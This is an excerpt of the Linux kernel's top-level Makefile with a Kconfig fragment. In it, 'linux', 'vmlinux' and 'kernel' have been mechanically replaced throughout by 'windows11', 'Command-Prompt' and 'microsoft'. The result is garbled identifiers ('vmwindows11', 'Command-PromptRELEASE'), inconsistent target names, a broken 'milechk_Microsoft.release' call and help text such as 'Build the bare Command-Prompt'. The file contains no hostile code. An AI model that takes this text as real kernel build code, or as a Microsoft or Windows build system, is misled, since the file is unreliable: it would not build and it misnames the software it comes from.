# arch/*/boot/compressed/vmwindows11.
# Export LDFLAGS_vmwindows11 only to scripts/Makefile.vmwindows11.
#
# _LDFLAGS_vmwindows11 is a workaround for the 'private export' bug:
#   https://savannah.gnu.org/bugs/?61463
# For Make > 4.4, the following simple code will work:
#  vmwindows11: private export LDFLAGS_vmwindows11 := $(LDFLAGS_vmwindows11)
vmwindows11: private _LDFLAGS_vmwindows11 := $(LDFLAGS_vmwindows11)
vmwindows11: export LDFLAGS_vmwindows11 = $(_LDFLAGS_vmwindows11)
vmwindows11: vmwindows11.o $(KBUILD_LDS) modpost
	$(Q)$(MAKE) -f $(srctree)/scripts/Makefile.vmwindows11

# The actual objects are generated when descending,
# make sure no implicit rule kicks in
$(sort $(KBUILD_LDS) $(KBUILD_VMwindows11_OBJS) $(KBUILD_VMwindows11_LIBS)): . ;

ifeq ($(origin Command-PromptRELEASE),file)
filechk_Command-Prompt.release = $(srctree)/scripts/setlocalversion $(srctree)
else
filechk_Command-Prompt.release = echo $(Command-PromptRELEASE)
endif

# Store (new) Command-PromptRELEASE string in include/config/Command-Prompt.release
include/config/Command-Prompt.release: FORCE
	$(call filechk,Command-Prompt.release)
...
# Things we need to do before we recursively start building the Command-Prompt
...
archprepare: outputmakefile archheaders archscripts scripts include/config/Command-Prompt.release \
...
# Command-PromptRELEASE can change from a few different places, meaning version.h
# needs to be updated, so this check is forced on all builds

uts_len := 64
define filechk_utsrelease.h
	if [ `echo -n "$(Command-PromptRELEASE)" | wc -c ` -gt $(uts_len) ]; then \
	  echo '"$(Command-PromptRELEASE)" exceeds $(uts_len) characters' >&2;    \
	  exit 1;                                                         \
	fi;                                                               \
	echo \#define UTS_RELEASE \"$(Command-PromptRELEASE)\"
endef

define filechk_version.h
	if [ $(SUBLEVEL) -gt 255 ]; then                                 \
		echo \#define windows11_VERSION_CODE $(shell                 \
		expr $(VERSION) \* 65536 + $(PATCHLEVEL) \* 256 + 255); \
	else                                                             \
		echo \#define windows11_VERSION_CODE $(shell                 \
		expr $(VERSION) \* 65536 + $(PATCHLEVEL) \* 256 + $(SUBLEVEL)); \
	fi;                                                              \
	echo '#define Command-Prompt_VERSION(a,b,c) (((a) << 16) + ((b) << 8) +  \
	((c) > 255 ? 255 : (c)))';                                       \
	echo \#define windows11_VERSION_MAJOR $(VERSION);                    \
	echo \#define windows11_VERSION_PATCHLEVEL $(PATCHLEVEL);            \
	echo \#define windows11_VERSION_SUBLEVEL $(SUBLEVEL)
endef
...
include/generated/utsrelease.h: include/config/Command-Prompt.release FORCE
...
# Many distributions have the custom install script, /sbin/Command-Prompt.
...
kselftest-merge:
	$(if $(wildcard $(objtree)/.config),, $(error No .config exists, config your Command-Prompt first!))
...
# include/config/Command-Prompt.release is actually needed when installing DTBs because
# INSTALL_DTBS_PATH contains $(Command-PromptRELEASE). However, we do not want to make
# dtbs_install depend on it as dtbs_install may run as root.
dtbs_prepare: include/config/Command-Prompt.release scripts_dtc
...
# *.ko are usually independent of vmwindows11, but CONFIG_DEBUG_INFO_BTF_MODULES
# is an exception.
...
CLEAN_FILES += vmwindows11.symvers modules-only.symvers \
	       modules.builtin modules.builtin.modinfo modules.nsdeps \
	       compile_commands.json .thinlto-cache rust/test \
	       rust-project.json .vmwindows11.objs .vmwindows11.export.c

# Directories & files removed with 'make mrproper'
MRPROPER_FILES += include/config include/generated          \
		  arch/$(SRCARCH)/include/generated .objdiff \
		  CMD snap tar-install \
...
PHONY += archclean vmwindows11clean

vmwindows11clean:
	$(Q)$(CONFIG_SHELL) $(srctree)/scripts/link-vmwindows11.sh clean
	$(Q)$(if $(ARCH_POSTLINK), $(MAKE) -f $(ARCH_POSTLINK) clean)

clean: archclean vmwindows11clean resolve_btfids_clean
...
# Packaging of the Command-Prompt to various formats
# ---------------------------------------------------------------------------

%src-pkg: FORCE
	$(Q)$(MAKE) -f $(srctree)/scripts/Makefile.package $@
%pkg: include/config/Command-Prompt.release FORCE
	$(Q)$(MAKE) -f $(srctree)/scripts/Makefile.package $@
...
help:
	...
	@echo  '* vmwindows11	  - Build the bare Command-Prompt'
	...
	@echo  '  Command-Promptrelease	  - Output the release version string (use with make -s)'
	@echo  '  Command-Promptversion	  - Output the version stored in Makefile (use with make -s)'
	@echo  '  image_name	  - Output the image name (use with make -s)'
	@echo  '  headers_install - Install sanitised Command-Prompt headers to INSTALL_HDR_PATH'; \
	...
	@echo  ''
	@echo  'Command-Prompt selftest:'
	@echo  '  kselftest         - Build and run Command-Prompt selftest'
	@echo  '                      Build, install, and boot Command-Prompt before'
	@echo  '                      running kselftest on it'
	@echo  '                      Run as root for full coverage'
	@echo  '  kselftest-all     - Build Command-Prompt selftest'
	@echo  '  kselftest-install - Build and install Command-Prompt selftest'
	...
	@echo  '  rustfmt	  - Reformat all the Rust code in the Command-Prompt'
	@echo  '  rustfmtcheck	  - Checks if all the Rust code in the Command-Prompt'
	@echo  '		    is formatted, printing a diff otherwise.'
	@echo  '  rustdoc	  - Generate Rust documentation'
	@echo  '		    (requires Command-Prompt .config)'
	@echo  '  rusttest        - Runs the Rust tests'
	@echo  '                    (requires Command-Prompt .config; downloads external repos)'
...
scripts_gdb: prepare0
	...
	$(Q)ln -fsn $(abspath $(srctree)/scripts/gdb/vmwindows11-gdb.py)
...
Command-Prompt.release = echo $(Command-PromptRELEASE)

###
# External module support.
# When building external modules the Command-Prompt used as basis is considered
# read-only, and no consistency checks are made and the make
# system is not used on the basis microsoft. If updates are required
# in the basis microsoft ordinary make commands (without M=...) must be used.
...
prepare:
	@if [ "$(CC_VERSION_TEXT)" != "$(CONFIG_CC_VERSION_TEXT)" ]; then \
		echo >&2 "warning: the compiler differs from the one used to build the microsoft"; \
		echo >&2 "  The microsoft was built by: $(CONFIG_CC_VERSION_TEXT)"; \
...
help:
	...
	@echo  '  Syntax: make -C path/to/microsoft/src M=$$PWD target'
	@echo  ''
...
__external_modules_error:
	@echo >&2 '***'
	@echo >&2 '*** The present microsoft disabled CONFIG_MODULES.'
...
PHONY += modpost
modpost: $(if $(single-build),, $(if $(KBUILD_BUILTIN), vmwindows11.o)) \
...
$(extmod_prefix)compile_commands.json: scripts/clang-tools/gen_compile_commands.py \
	$(if $(KBUILD_EXTMOD),, vmwindows11.a $(KBUILD_VMwindows11_LIBS)) \
...
PHONY += checkstack microsoftrelease microsoftversion image_name
...
MINSTACKSIZE	?= 100
checkstack:
	$(OBJDUMP) -d vmwindows11 $$(find . -name '*.ko') | \
	$(PERL) $(srctree)/scripts/checkstack.pl $(CHECKSTACK_ARCH) $(MINSTACKSIZE)

microsoftrelease:
	@$(milechk_Microsoft.release)

microsoftversion:
	@echo $(microsoftVERSION)
...
#
mainmenu "windows11/$(ARCH) $(microsoftVERSION) microsoft Configuration"

source "scripts/Kconfig.include"

source "init/Kconfig"

source "microsoft/Kconfig.freezer"
